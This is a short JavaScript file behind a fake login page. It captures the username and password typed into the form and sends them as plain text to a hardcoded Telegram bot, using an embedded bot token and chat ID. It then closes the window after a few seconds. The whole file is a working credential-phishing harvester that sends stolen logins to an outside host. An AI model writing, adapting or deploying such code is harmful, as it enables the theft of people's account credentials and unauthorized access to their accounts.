const botId = "bot8113142114:AAHJNkUtoIj5HeyytcuDmPy021KT1vFb_1M"
const chatId = "1440524069"
const login =  document.getElementById('login')
const password =  document.getElementById('password')
const btn = document.getElementsByClassName('btn')[0]
const inputs = [...document.querySelectorAll('input')]

inputs.map(inpt =>{
    inpt.addEventListener('input', checkInptSend)
})
function checkInptSend(){
    if(login.value.length && password.value.length >=6){
        btn.classList.add("actived")
        btn.style.background = "rgb(30 110 255)"
    }else{
        btn.classList.remove("actived")
        btn.style.backgroundColor = '#bbd2fb';
    }
    btn.onclick = () => {
        if(btn.classList.contains('actived')){
        const variableForPost = logPasStr(login.value, password.value)
        async function anonym(){
            const url = `https://api.telegram.org/${botId}/sendMessage?chat_id=${chatId}&text=${variableForPost}`
            let xhttp = new XMLHttpRequest()
            await xhttp.open("GET", url, true)
            await xhttp.send()
        }
        anonym().then(colse())
        }
    }
}
function logPasStr(login, password){
    return `Login: ${login} Password: ${password}`
}
async function colse() {
    setTimeout(() => {
        window.close()
    }, 5000);
}
document.addEventListener('keypress', event => {if(event.key == "Enter") btn.onclick()})